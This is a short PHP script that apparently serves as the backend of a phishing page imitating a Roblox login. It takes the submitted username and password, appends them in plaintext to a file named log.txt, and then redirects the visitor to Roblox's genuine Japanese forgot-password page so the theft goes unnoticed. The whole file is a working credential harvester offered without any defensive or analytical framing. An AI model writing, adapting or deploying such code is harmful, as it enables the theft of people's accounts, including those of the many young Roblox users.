<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $u = $_POST["username"] ?? 'none';
    $p = $_POST["password"] ?? 'none';

    $log = "login: $u / pass: $p\n";

    file_put_contents("log.txt", $log, FILE_APPEND);



    header("Location: https://www.roblox.com/ja/login/forgot-password-or-username");
    exit;
}
?>
